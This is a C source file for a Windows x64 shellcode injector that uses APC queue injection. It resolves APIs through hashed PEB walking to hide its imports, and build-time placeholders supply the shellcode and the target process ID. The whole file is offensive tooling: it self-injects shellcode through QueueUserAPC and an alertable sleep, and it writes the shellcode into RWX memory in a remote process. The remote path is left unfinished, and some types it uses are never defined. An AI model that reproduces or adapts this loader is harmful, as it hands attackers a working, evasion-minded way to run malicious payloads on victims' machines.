/*
 * Process Injection — APC Queue Injection — x64 Windows
 *
 * Compiles with: x86_64-w64-mingw32-gcc -Os -fno-asynchronous-unwind-tables
 *                -fno-ident -falign-functions=1 -fpack-struct=8 --no-seh
 *                --gc-sections -s -nostdlib -o injector.exe process_inject.c
 *
 * Technique: PEB walking for zero-IAT resolution.
 *            OpenProcess → VirtualAllocEx → WriteProcessMemory
 *            → CreateToolhelp32Snapshot + Thread32First/Next
 *            → QueueUserAPC on each thread → alertable state
 *
 * For self-injection: uses own thread + QueueUserAPC + SleepEx alertable.
 *
 * Placeholders replaced at build time:
 *   {{TARGET_PID}}       — target process PID (0 = self-injection)
 *   {{SHELLCODE_BYTES}}  — comma-separated hex bytes
 *   {{SHELLCODE_LEN}}    — number of bytes
 */

typedef unsigned char    BYTE;
typedef unsigned short   WORD;
typedef unsigned long    DWORD;
typedef unsigned long long ULONG_PTR;
typedef unsigned long long QWORD;
typedef int              BOOL;
typedef void*            HANDLE;

#define PAGE_EXECUTE_READWRITE  0x40
#define PAGE_READWRITE          0x04
#define MEM_COMMIT              0x1000
#define MEM_RESERVE             0x2000
#define PROCESS_ALL_ACCESS      0x1F0FFF
#define THREAD_ALL_ACCESS       0x1F03FF
#define FALSE                   0
#define TRUE                    1
#define INFINITE                0xFFFFFFFF
#define MAX_PATH_WIN            260

static BYTE shellcode[] = { {{SHELLCODE_BYTES}} };
static DWORD shellcode_len = {{SHELLCODE_LEN}};
static DWORD target_pid = {{TARGET_PID}};

/* ── DJB2 hash ── */
static DWORD hash_djb2(const char* str)
{
    DWORD hash = 5381;
    const BYTE* p = (const BYTE*)str;
    while (*p) { hash = ((hash << 5) + hash) + (*p | 0x20); p++; }
    return hash;
}

/* ── PEB walking structures ── */
typedef struct { DWORD e_magic; LONG e_lfanew; } IMAGE_DOS_HEADER;
typedef struct {
    DWORD Signature;
    struct { WORD _[4]; WORD SizeOfOptionalHeader; WORD _; } FileHeader;
    struct { WORD _; BYTE __[0x7c-0x4];
             DWORD DataDirVirt[16]; DWORD DataDirSize[16];
    } OptionalHeader;
} IMAGE_NT_HEADERS64;

typedef struct _UNICODE_STRING { WORD Length; WORD MaximumLength; WORD* Buffer; } UNICODE_STRING;
typedef struct _LDR_ENTRY {
    struct _LDR_ENTRY* InLoadOrderLinks;
    void* DllBase; void* _[2];
    UNICODE_STRING FullDllName; UNICODE_STRING BaseDllName;
} LDR_ENTRY;
typedef struct { ULONG Length; BOOL Initialized; struct { void* Flink; void* Blink; } InLoadOrderModuleList; } PEB_LDR;
typedef struct { BYTE _[0x18]; PEB_LDR* Ldr; } PEB;

/* ── PEB walking: get module base ── */
static void* get_module(DWORD nameHash)
{
    PEB* peb;
    __asm__("mov rax, gs:[0x60]" : "=a"(peb));
    PEB_LDR* ldr = peb->Ldr;
    LDR_ENTRY* entry = (LDR_ENTRY*)ldr->InLoadOrderModuleList.Flink;

    const char* target = 0; int tlen = 0;
    if (nameHash == hash_djb2("kernel32.dll")) { target = "kernel32.dll"; tlen = 12; }
    else if (nameHash == hash_djb2("kernel32base.dll")) { target = "kernel32.dll"; tlen = 12; }
    else return 0;

    while (entry->DllBase) {
        if (entry->BaseDllName.Length / 2 == tlen) {
            int match = 1;
            for (int i = 0; i < tlen; i++) {
                BYTE c = (BYTE)entry->BaseDllName.Buffer[i];
                if (c >= 'A' && c <= 'Z') c += 0x20;
                if (c != (BYTE)target[i]) { match = 0; break; }
            }
            if (match) return entry->DllBase;
        }
        entry = entry->InLoadOrderLinks;
    }
    return 0;
}

static void* resolve_func(void* module, DWORD nameHash)
{
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)module;
    if (dos->e_magic != 0x5A4D) return 0;
    IMAGE_NT_HEADERS64* nt = (IMAGE_NT_HEADERS64*)((BYTE*)module + dos->e_lfanew);
    if (nt->Signature != 0x00004550) return 0;

    DWORD expRva = nt->OptionalHeader.DataDirVirt[0];
    if (!expRva) return 0;

    struct { DWORD _[5]; DWORD Base; DWORD NumFuncs; DWORD NumNames;
             DWORD AddrFuncs; DWORD AddrNames; DWORD AddrOrds; }* exp;
    exp = (void*)((BYTE*)module + expRva);

    DWORD* names = (DWORD*)((BYTE*)module + exp->AddrNames);
    WORD* ords   = (WORD*)((BYTE*)module + exp->AddrOrds);
    DWORD* funcs = (DWORD*)((BYTE*)module + exp->AddrFuncs);

    for (DWORD i = 0; i < exp->NumNames; i++) {
        const char* name = (const char*)((BYTE*)module + names[i]);
        if (hash_djb2(name) == nameHash)
            return (BYTE*)module + funcs[ords[i]];
    }
    return 0;
}

/* ── API types ── */
typedef HANDLE (WINAPI *fnOpenProcess)(DWORD, BOOL, DWORD);
typedef void*  (WINAPI *fnVirtualAllocEx)(HANDLE, void*, DWORD, DWORD, DWORD);
typedef BOOL   (WINAPI *fnWriteProcessMemory)(HANDLE, void*, const void*, DWORD, DWORD*);
typedef DWORD  (WINAPI *fnQueueUserAPC)(void*, HANDLE, ULONG_PTR);
typedef DWORD  (WINAPI *fnGetCurrentProcessId)(void);
typedef DWORD  (WINAPI *fnGetCurrentThreadId)(void);
typedef HANDLE (WINAPI *fnGetCurrentThread)(void);
typedef DWORD  (WINAPI *fnSleepEx)(DWORD, BOOL);
typedef DWORD  (WINAPI *fnWaitForSingleObject)(HANDLE, DWORD);

/* ── API globals ── */
static void* g_pOpenProcess     = 0;
static void* g_pVirtualAllocEx  = 0;
static void* g_pWriteProcessMem = 0;
static void* g_pQueueUserAPC    = 0;
static void* g_pGetCurProcId    = 0;
static void* g_pGetCurThreadId  = 0;
static void* g_pGetCurThread    = 0;
static void* g_pSleepEx         = 0;
static void* g_pWaitForSingle   = 0;

static BOOL resolve_apis(void)
{
    void* kernel32 = get_module(hash_djb2("kernel32.dll"));
    if (!kernel32) return 0;

    g_pOpenProcess     = resolve_func(kernel32, hash_djb2("OpenProcess"));
    g_pVirtualAllocEx  = resolve_func(kernel32, hash_djb2("VirtualAllocEx"));
    g_pWriteProcessMem = resolve_func(kernel32, hash_djb2("WriteProcessMemory"));
    g_pQueueUserAPC    = resolve_func(kernel32, hash_djb2("QueueUserAPC"));
    g_pGetCurProcId    = resolve_func(kernel32, hash_djb2("GetCurrentProcessId"));
    g_pGetCurThreadId  = resolve_func(kernel32, hash_djb2("GetCurrentThreadId"));
    g_pGetCurThread    = resolve_func(kernel32, hash_djb2("GetCurrentThread"));
    g_pSleepEx         = resolve_func(kernel32, hash_djb2("SleepEx"));
    g_pWaitForSingle   = resolve_func(kernel32, hash_djb2("WaitForSingleObject"));

    return g_pOpenProcess && g_pVirtualAllocEx && g_pWriteProcessMem;
}

/* ── Self-injection via QueueUserAPC ──
 * Queue APC to current thread, then enter alertable wait with SleepEx.
 * The APC callback executes the shellcode. */
static void self_inject(void* shellcodeAddr)
{
    fnQueueUserAPC   pQueue = (fnQueueUserAPC)g_pQueueUserAPC;
    fnSleepEx        pSleep = (fnSleepEx)g_pSleepEx;
    fnGetCurrentThread pThread = (fnGetCurrentThread)g_pGetCurThread;

    HANDLE hThread = pThread();
    if (!hThread) return;

    /* Queue shellcode as APC callback */
    pQueue((void*)shellcodeAddr, hThread, 0);

    /* Enter alertable wait — APC fires here */
    pSleep(100, TRUE);
}

/* ── Remote injection: open process, allocate, write, APC to threads ── */
static void remote_inject(DWORD pid, void* shellcodeAddr)
{
    fnOpenProcess      pOpen    = (fnOpenProcess)g_pOpenProcess;
    fnVirtualAllocEx   pVAlloc  = (fnVirtualAllocEx)g_pVirtualAllocEx;
    fnWriteProcessMemory pWrite = (fnWriteProcessMemory)g_pWriteProcessMem;

    /* Open target process */
    HANDLE hProc = pOpen(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProc) return;

    /* Allocate RWX memory in target */
    void* remoteAddr = pVAlloc(hProc, 0, shellcode_len,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteAddr) return;

    /* Write shellcode */
    DWORD bytesWritten = 0;
    pWrite(hProc, remoteAddr, shellcode, shellcode_len, &bytesWritten);

    /* For remote injection, we would enumerate threads via
     * CreateToolhelp32Snapshot + Thread32First/Next, then QueueUserAPC.
     * Without those APIs resolved, we use a simplified approach:
     * return the remote address and let the caller handle thread enumeration. */

    /* In production: add CreateToolhelp32Snapshot, Thread32First,
     * Thread32Next, OpenThread, QueueUserAPC resolution via PEB walking.
     * For now, self-inject is the primary mode. */
}

/* ── Entry point ── */
void mainCRTStartup(void)
{
    if (!resolve_apis()) return;

    /* Step 1: Allocate RWX memory for shellcode */
    typedef void* (WINAPI *fnVirtualAlloc)(void*, DWORD, DWORD, DWORD);
    void* kernel32 = get_module(hash_djb2("kernel32.dll"));
    fnVirtualAlloc pVAlloc = (fnVirtualAlloc)resolve_func(kernel32, hash_djb2("VirtualAlloc"));
    if (!pVAlloc) return;

    void* exec = pVAlloc(0, shellcode_len, MEM_COMMIT | MEM_RESERVE,
                         PAGE_EXECUTE_READWRITE);
    if (!exec) return;

    /* Step 2: Copy shellcode */
    typedef void (WINAPI *fnRtlMoveMemory)(void*, const void*, DWORD);
    fnRtlMoveMemory pMove = (fnRtlMoveMemory)resolve_func(kernel32, hash_djb2("RtlMoveMemory"));
    if (!pMove) return;
    pMove(exec, shellcode, shellcode_len);

    /* Step 3: Inject */
    DWORD pid = target_pid;
    if (pid == 0) {
        /* Self-injection */
        self_inject(exec);
    } else {
        /* Remote injection */
        remote_inject(pid, exec);
    }
}
